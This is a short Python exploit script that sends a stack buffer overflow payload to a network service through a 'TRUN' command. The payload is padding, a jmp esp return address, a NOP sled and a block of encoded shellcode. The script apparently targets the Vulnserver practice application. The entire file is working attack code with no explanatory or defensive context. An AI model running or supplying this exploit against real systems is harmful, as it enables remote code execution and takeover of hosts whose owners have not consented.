#!/usr/bin/python

import sys
import socket
import struct
from time import sleep

ip = str(sys.argv[1])
port = int(sys.argv[2])

if len(sys.argv) <= 2 or len(sys.argv) >= 4: # 3 arguments
    print("[!] Too many arguments!")
    print("[!] Usage: {} ip port".format(sys.argv[0]))
    sys.exit()
else:
    pass

def attack(ip, port):

    nops = "\x90"

    buf =  ""
    buf += "\xda\xd9\xd9\x74\x24\xf4\xbd\xb1\xb3\xa5\x94\x5e\x29"
    buf += "\xc9\xb1\x52\x31\x6e\x17\x03\x6e\x17\x83\x5f\x4f\x47"
    buf += "\x61\x63\x58\x0a\x8a\x9b\x99\x6b\x02\x7e\xa8\xab\x70"
    buf += "\x0b\x9b\x1b\xf2\x59\x10\xd7\x56\x49\xa3\x95\x7e\x7e"
    buf += "\x04\x13\x59\xb1\x95\x08\x99\xd0\x15\x53\xce\x32\x27"
    buf += "\x9c\x03\x33\x60\xc1\xee\x61\x39\x8d\x5d\x95\x4e\xdb"
    buf += "\x5d\x1e\x1c\xcd\xe5\xc3\xd5\xec\xc4\x52\x6d\xb7\xc6"
    buf += "\x55\xa2\xc3\x4e\x4d\xa7\xee\x19\xe6\x13\x84\x9b\x2e"
    buf += "\x6a\x65\x37\x0f\x42\x94\x49\x48\x65\x47\x3c\xa0\x95"
    buf += "\xfa\x47\x77\xe7\x20\xcd\x63\x4f\xa2\x75\x4f\x71\x67"
    buf += "\xe3\x04\x7d\xcc\x67\x42\x62\xd3\xa4\xf9\x9e\x58\x4b"
    buf += "\x2d\x17\x1a\x68\xe9\x73\xf8\x11\xa8\xd9\xaf\x2e\xaa"
    buf += "\x81\x10\x8b\xa1\x2c\x44\xa6\xe8\x38\xa9\x8b\x12\xb9"
    buf += "\xa5\x9c\x61\x8b\x6a\x37\xed\xa7\xe3\x91\xea\xc8\xd9"
    buf += "\x66\x64\x37\xe2\x96\xad\xfc\xb6\xc6\xc5\xd5\xb6\x8c"
    buf += "\x15\xd9\x62\x02\x45\x75\xdd\xe3\x35\x35\x8d\x8b\x5f"
    buf += "\xba\xf2\xac\x60\x10\x9b\x47\x9b\xf3\x64\x3f\x9b\x66"
    buf += "\x0d\x42\xdb\x4f\xca\xcb\x3d\xe5\xc4\x9d\x96\x92\x7d"
    buf += "\x84\x6c\x02\x81\x12\x09\x04\x09\x91\xee\xcb\xfa\xdc"
    buf += "\xfc\xbc\x0a\xab\x5e\x6a\x14\x01\xf6\xf0\x87\xce\x06"
    buf += "\x7e\xb4\x58\x51\xd7\x0a\x91\x37\xc5\x35\x0b\x25\x14"
    buf += "\xa3\x74\xed\xc3\x10\x7a\xec\x86\x2d\x58\xfe\x5e\xad"
    buf += "\xe4\xaa\x0e\xf8\xb2\x04\xe9\x52\x75\xfe\xa3\x09\xdf"
    buf += "\x96\x32\x62\xe0\xe0\x3a\xaf\x96\x0c\x8a\x06\xef\x33"
    buf += "\x23\xcf\xe7\x4c\x59\x6f\x07\x87\xd9\x9f\x42\x85\x48"
    buf += "\x08\x0b\x5c\xc9\x55\xac\x8b\x0e\x60\x2f\x39\xef\x97"
    buf += "\x2f\x48\xea\xdc\xf7\xa1\x86\x4d\x92\xc5\x35\x6d\xb7"


    # jmp esp 625011BB

    payload = ''
    payload += "A" * 2003
    payload += struct.pack("I",0x625011BB)
    payload += nops * 16
    payload += buf
    payload += nops * (3000 - len(payload))

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print(s.recv(1024))
        s.send("TRUN /.:/" + payload)
        print("[+] Attack sent !")
        print("[+] Closing socket..]")
        s.close()
    except:
        print("[!] Cannot Connect to: {}".format(ip))
        sys.exit()

if __name__ == '__main__':
    attack(ip, port)
